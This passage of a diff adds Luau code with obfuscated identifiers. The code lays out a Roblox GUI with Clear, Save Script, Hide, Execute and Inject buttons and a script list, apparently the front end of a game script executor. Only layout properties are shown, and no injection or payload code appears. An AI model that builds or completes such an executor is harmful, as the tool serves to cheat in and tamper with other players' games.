+fd4hh21cgefg.hc6h6d4cff8c893g5ef.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.ScaleType = Enum.ScaleType.Fit;
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.Image = "rbxassetid://3605509925";
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.ImageContent = Content;
+fd4hh21cgefg.hc6h6d4cff8c893g5ef.Parent = fd4hh21cgefg.h57c2ag73;
+
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.Name = "BottomButtons";
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.AnchorPoint = Vector2.new(0, 1);
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.ZIndex = 2;
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.Size = UDim2.new(1, -129, 0, 24);
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.BackgroundTransparency = 1;
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.Position = UDim2.new(0, 10, 1, -8);
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17.Parent = fd4hh21cgefg.d4884ed51742h20a622f46232eb24;
+
+fd4hh21cgefg.c56fb09a7h2gbh3df79e5bdg.Name = "UIListLayout";
+fd4hh21cgefg.c56fb09a7h2gbh3df79e5bdg.Padding = UDim.new(0, 5);
+fd4hh21cgefg.c56fb09a7h2gbh3df79e5bdg.Parent = fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17;
+
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Name = "ClearBtn";
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.AutoButtonColor = true;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.LayoutOrder = 1;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Active = false;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.ZIndex = 2;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Size = UDim2.new(0, 107, 0, 24);
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Selectable = false;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.BackgroundTransparency = 1;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Position = UDim2.new(0, 0, -1.58333337, 0);
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.ImageContent = Content;
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b.Parent = fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17;
+
+fd4hh21cgefg.g08g669ha2d3g7cb5.Name = "ImageButton";
+fd4hh21cgefg.g08g669ha2d3g7cb5.AutoButtonColor = true;
+fd4hh21cgefg.g08g669ha2d3g7cb5.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.g08g669ha2d3g7cb5.ZIndex = 2;
+fd4hh21cgefg.g08g669ha2d3g7cb5.Size = UDim2.new(0, 24, 0, 24);
+fd4hh21cgefg.g08g669ha2d3g7cb5.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g08g669ha2d3g7cb5.BackgroundTransparency = 1;
+fd4hh21cgefg.g08g669ha2d3g7cb5.Position = UDim2.new(0.023, 0, 0.5, 0);
+fd4hh21cgefg.g08g669ha2d3g7cb5.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g08g669ha2d3g7cb5.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g08g669ha2d3g7cb5.Image = "http://www.roblox.com/asset/?id=6022668885";
+fd4hh21cgefg.g08g669ha2d3g7cb5.ImageContent = Content;
+fd4hh21cgefg.g08g669ha2d3g7cb5.Parent = fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b;
+
+fd4hh21cgefg.c547f0gd.Name = "TextLabel";
+fd4hh21cgefg.c547f0gd.AutoButtonColor = true;
+fd4hh21cgefg.c547f0gd.Active = false;
+fd4hh21cgefg.c547f0gd.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.c547f0gd.ZIndex = 2;
+fd4hh21cgefg.c547f0gd.Size = UDim2.new(1, -40, 1, 0);
+fd4hh21cgefg.c547f0gd.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c547f0gd.Selectable = false;
+fd4hh21cgefg.c547f0gd.BackgroundTransparency = 1;
+fd4hh21cgefg.c547f0gd.Position = UDim2.new(0, 30, 0.5, 0);
+fd4hh21cgefg.c547f0gd.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.c547f0gd.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c547f0gd.Text = "Clear";
+fd4hh21cgefg.c547f0gd.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.c547f0gd.TextWrapped = true;
+fd4hh21cgefg.c547f0gd.Parent = fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b;
+
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.Name = "Hitbox";
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.AutoButtonColor = true;
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.ZIndex = 3;
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.BackgroundTransparency = 1;
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.Text = "";
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.TextTransparency = 1;
+fd4hh21cgefg.ag6hfe170cbg9gc55b5bg6.Parent = fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b;
+
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Name = "SaveBtn";
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.AutoButtonColor = true;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.LayoutOrder = 3;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Active = false;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.ZIndex = 2;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Size = UDim2.new(0, 107, 0, 24);
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Selectable = false;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.BackgroundTransparency = 1;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Position = UDim2.new(0, 0, -1.58333337, 0);
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.ImageContent = Content;
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5.Parent = fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17;
+
+fd4hh21cgefg.g424469e37.Name = "ImageButton";
+fd4hh21cgefg.g424469e37.AutoButtonColor = true;
+fd4hh21cgefg.g424469e37.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.g424469e37.ZIndex = 2;
+fd4hh21cgefg.g424469e37.Size = UDim2.new(0, 24, 0, 24);
+fd4hh21cgefg.g424469e37.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g424469e37.BackgroundTransparency = 1;
+fd4hh21cgefg.g424469e37.Position = UDim2.new(0.023, 0, 0.5, 0);
+fd4hh21cgefg.g424469e37.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g424469e37.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g424469e37.Image = "http://www.roblox.com/asset/?id=6035067857";
+fd4hh21cgefg.g424469e37.ImageContent = Content;
+fd4hh21cgefg.g424469e37.Parent = fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5;
+
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Name = "TextLabel";
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.AutoButtonColor = true;
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Active = false;
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.ZIndex = 2;
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Size = UDim2.new(1, -40, 1, 0);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Selectable = false;
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.BackgroundTransparency = 1;
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Position = UDim2.new(0, 30, 0.5, 0);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Text = "Save Script";
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.TextWrapped = true;
+fd4hh21cgefg.gaf8c5320a118g763fga5dbe564e3551.Parent = fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5;
+
+fd4hh21cgefg.hbh59.Name = "Hitbox";
+fd4hh21cgefg.hbh59.AutoButtonColor = true;
+fd4hh21cgefg.hbh59.ZIndex = 3;
+fd4hh21cgefg.hbh59.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.hbh59.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hbh59.BackgroundTransparency = 1;
+fd4hh21cgefg.hbh59.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.hbh59.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hbh59.Text = "";
+fd4hh21cgefg.hbh59.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.hbh59.TextTransparency = 1;
+fd4hh21cgefg.hbh59.Parent = fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5;
+
+fd4hh21cgefg.a0c39934h6.Name = "HideBtn";
+fd4hh21cgefg.a0c39934h6.AutoButtonColor = true;
+fd4hh21cgefg.a0c39934h6.LayoutOrder = 3;
+fd4hh21cgefg.a0c39934h6.Active = false;
+fd4hh21cgefg.a0c39934h6.ZIndex = 2;
+fd4hh21cgefg.a0c39934h6.Size = UDim2.new(0, 107, 0, 24);
+fd4hh21cgefg.a0c39934h6.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a0c39934h6.Selectable = false;
+fd4hh21cgefg.a0c39934h6.BackgroundTransparency = 1;
+fd4hh21cgefg.a0c39934h6.Position = UDim2.new(0, 0, -1.58333337, 0);
+fd4hh21cgefg.a0c39934h6.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.a0c39934h6.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a0c39934h6.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.a0c39934h6.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.a0c39934h6.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.a0c39934h6.ImageContent = Content;
+fd4hh21cgefg.a0c39934h6.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.a0c39934h6.Parent = fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17;
+
+fd4hh21cgefg.c31ghdc95dge715d640ec.Name = "ImageButton";
+fd4hh21cgefg.c31ghdc95dge715d640ec.AutoButtonColor = true;
+fd4hh21cgefg.c31ghdc95dge715d640ec.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.c31ghdc95dge715d640ec.ZIndex = 2;
+fd4hh21cgefg.c31ghdc95dge715d640ec.Size = UDim2.new(0, 24, 0, 24);
+fd4hh21cgefg.c31ghdc95dge715d640ec.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c31ghdc95dge715d640ec.BackgroundTransparency = 1;
+fd4hh21cgefg.c31ghdc95dge715d640ec.Position = UDim2.new(0.023, 0, 0.5, 0);
+fd4hh21cgefg.c31ghdc95dge715d640ec.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.c31ghdc95dge715d640ec.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c31ghdc95dge715d640ec.Image = "http://www.roblox.com/asset/?id=6031075929";
+fd4hh21cgefg.c31ghdc95dge715d640ec.ImageContent = Content;
+fd4hh21cgefg.c31ghdc95dge715d640ec.Parent = fd4hh21cgefg.a0c39934h6;
+
+fd4hh21cgefg.gehd1h0.Name = "TextLabel";
+fd4hh21cgefg.gehd1h0.AutoButtonColor = true;
+fd4hh21cgefg.gehd1h0.Active = false;
+fd4hh21cgefg.gehd1h0.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.gehd1h0.ZIndex = 2;
+fd4hh21cgefg.gehd1h0.Size = UDim2.new(1, -40, 1, 0);
+fd4hh21cgefg.gehd1h0.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gehd1h0.Selectable = false;
+fd4hh21cgefg.gehd1h0.BackgroundTransparency = 1;
+fd4hh21cgefg.gehd1h0.Position = UDim2.new(0, 30, 0.5, 0);
+fd4hh21cgefg.gehd1h0.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.gehd1h0.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.gehd1h0.Text = "Hide";
+fd4hh21cgefg.gehd1h0.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.gehd1h0.TextWrapped = true;
+fd4hh21cgefg.gehd1h0.Parent = fd4hh21cgefg.a0c39934h6;
+
+fd4hh21cgefg.fe98182bg71hf.Name = "Hitbox";
+fd4hh21cgefg.fe98182bg71hf.AutoButtonColor = true;
+fd4hh21cgefg.fe98182bg71hf.ZIndex = 3;
+fd4hh21cgefg.fe98182bg71hf.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.fe98182bg71hf.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe98182bg71hf.BackgroundTransparency = 1;
+fd4hh21cgefg.fe98182bg71hf.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.fe98182bg71hf.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe98182bg71hf.Text = "";
+fd4hh21cgefg.fe98182bg71hf.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.fe98182bg71hf.TextTransparency = 1;
+fd4hh21cgefg.fe98182bg71hf.Parent = fd4hh21cgefg.a0c39934h6;
+
+fd4hh21cgefg.df293hg76d3a.Name = "ExecuteBtn";
+fd4hh21cgefg.df293hg76d3a.AutoButtonColor = true;
+fd4hh21cgefg.df293hg76d3a.ZIndex = 2;
+fd4hh21cgefg.df293hg76d3a.Size = UDim2.new(0, 107, 0, 24);
+fd4hh21cgefg.df293hg76d3a.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.df293hg76d3a.Selectable = false;
+fd4hh21cgefg.df293hg76d3a.BorderSizePixel = 0;
+fd4hh21cgefg.df293hg76d3a.BackgroundTransparency = 1;
+fd4hh21cgefg.df293hg76d3a.Position = UDim2.new(0, 0, -1.58333337, 0);
+fd4hh21cgefg.df293hg76d3a.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.df293hg76d3a.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.df293hg76d3a.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.df293hg76d3a.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.df293hg76d3a.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.df293hg76d3a.ImageContent = Content;
+fd4hh21cgefg.df293hg76d3a.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.df293hg76d3a.Parent = fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17;
+
+fd4hh21cgefg.fb7449ed.Name = "ImageButton";
+fd4hh21cgefg.fb7449ed.AutoButtonColor = true;
+fd4hh21cgefg.fb7449ed.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.fb7449ed.ZIndex = 2;
+fd4hh21cgefg.fb7449ed.Size = UDim2.new(0, 24, 0, 24);
+fd4hh21cgefg.fb7449ed.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fb7449ed.BackgroundTransparency = 1;
+fd4hh21cgefg.fb7449ed.Position = UDim2.new(0.0229007639, 0, 0.5, 0);
+fd4hh21cgefg.fb7449ed.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.fb7449ed.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fb7449ed.Image = "http://www.roblox.com/asset/?id=6026663699";
+fd4hh21cgefg.fb7449ed.ImageContent = Content;
+fd4hh21cgefg.fb7449ed.Parent = fd4hh21cgefg.df293hg76d3a;
+
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Name = "TextLabel";
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.AutoButtonColor = true;
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Active = false;
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.ZIndex = 2;
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Size = UDim2.new(1, -40, 1, 0);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Selectable = false;
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.BackgroundTransparency = 1;
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Position = UDim2.new(-0.0560747646, 30, 0.5, 0);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Text = "Execute";
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.TextWrapped = true;
+fd4hh21cgefg.e1ag4ff3653750e2f9h5a.Parent = fd4hh21cgefg.df293hg76d3a;
+
+fd4hh21cgefg.dc024acaf4fh009.Name = "Hitbox";
+fd4hh21cgefg.dc024acaf4fh009.AutoButtonColor = true;
+fd4hh21cgefg.dc024acaf4fh009.ZIndex = 3;
+fd4hh21cgefg.dc024acaf4fh009.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.dc024acaf4fh009.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.dc024acaf4fh009.BackgroundTransparency = 1;
+fd4hh21cgefg.dc024acaf4fh009.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.dc024acaf4fh009.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.dc024acaf4fh009.Text = "";
+fd4hh21cgefg.dc024acaf4fh009.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.dc024acaf4fh009.TextTransparency = 1;
+fd4hh21cgefg.dc024acaf4fh009.Parent = fd4hh21cgefg.df293hg76d3a;
+
+fd4hh21cgefg.c6ecd7af8h1.Name = "InjectBtn";
+fd4hh21cgefg.c6ecd7af8h1.AutoButtonColor = true;
+fd4hh21cgefg.c6ecd7af8h1.LayoutOrder = 3;
+fd4hh21cgefg.c6ecd7af8h1.Active = false;
+fd4hh21cgefg.c6ecd7af8h1.ZIndex = 2;
+fd4hh21cgefg.c6ecd7af8h1.Size = UDim2.new(0, 99, 0, 24);
+fd4hh21cgefg.c6ecd7af8h1.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c6ecd7af8h1.Selectable = false;
+fd4hh21cgefg.c6ecd7af8h1.BackgroundTransparency = 1;
+fd4hh21cgefg.c6ecd7af8h1.Position = UDim2.new(1.02050114, 0, 0, 0);
+fd4hh21cgefg.c6ecd7af8h1.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.c6ecd7af8h1.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c6ecd7af8h1.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.c6ecd7af8h1.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.c6ecd7af8h1.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.c6ecd7af8h1.ImageContent = Content;
+fd4hh21cgefg.c6ecd7af8h1.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.c6ecd7af8h1.Parent = fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17;
+
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.Name = "ImageButton";
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.AutoButtonColor = true;
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.ZIndex = 2;
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.Size = UDim2.new(0, 24, 0, 24);
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.BackgroundTransparency = 1;
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.Position = UDim2.new(0.023, 0, 0.5, 0);
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.Image = "http://www.roblox.com/asset/?id=6035067857";
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.ImageContent = Content;
+fd4hh21cgefg.c5cga42585c14137f86acf53a286e2f.Parent = fd4hh21cgefg.c6ecd7af8h1;
+
+fd4hh21cgefg.h41ch80c0h.Name = "TextLabel";
+fd4hh21cgefg.h41ch80c0h.AutoButtonColor = true;
+fd4hh21cgefg.h41ch80c0h.Active = false;
+fd4hh21cgefg.h41ch80c0h.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.h41ch80c0h.ZIndex = 2;
+fd4hh21cgefg.h41ch80c0h.Size = UDim2.new(1, -40, 1, 0);
+fd4hh21cgefg.h41ch80c0h.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h41ch80c0h.Selectable = false;
+fd4hh21cgefg.h41ch80c0h.BackgroundTransparency = 1;
+fd4hh21cgefg.h41ch80c0h.Position = UDim2.new(0, 30, 0.5, 0);
+fd4hh21cgefg.h41ch80c0h.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.h41ch80c0h.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h41ch80c0h.Text = "Inject";
+fd4hh21cgefg.h41ch80c0h.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.h41ch80c0h.TextWrapped = true;
+fd4hh21cgefg.h41ch80c0h.Parent = fd4hh21cgefg.c6ecd7af8h1;
+
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.Name = "Hitbox";
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.AutoButtonColor = true;
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.ZIndex = 3;
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.BackgroundTransparency = 1;
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.Text = "";
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.TextTransparency = 1;
+fd4hh21cgefg.c044h28a6e9305d7f14631fb.Parent = fd4hh21cgefg.c6ecd7af8h1;
+
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.Name = "OpenScripts";
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.Active = true;
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.Size = UDim2.new(1, -130, 0, 29);
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.BorderSizePixel = 0;
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.BackgroundTransparency = 1;
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.Position = UDim2.new(0, 10, 0, 5);
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.CanvasSize = UDim2.new(0, 0, 0, 0);
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.ScrollBarImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.ScrollBarThickness = 3;
+fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b.Parent = fd4hh21cgefg.d4884ed51742h20a622f46232eb24;
+
+fd4hh21cgefg.hfdg0d8111a1h.Name = "UIListLayout";
+fd4hh21cgefg.hfdg0d8111a1h.Padding = UDim.new(0, 5);
+fd4hh21cgefg.hfdg0d8111a1h.Parent = fd4hh21cgefg.fe8460e7f58bc3hdee4ebcd71b;
+
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.Name = "999";
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.AutoButtonColor = true;
+fd4hh21cgefg.bgd0h0e840g603dd91g152ea.LayoutOrder = 500;
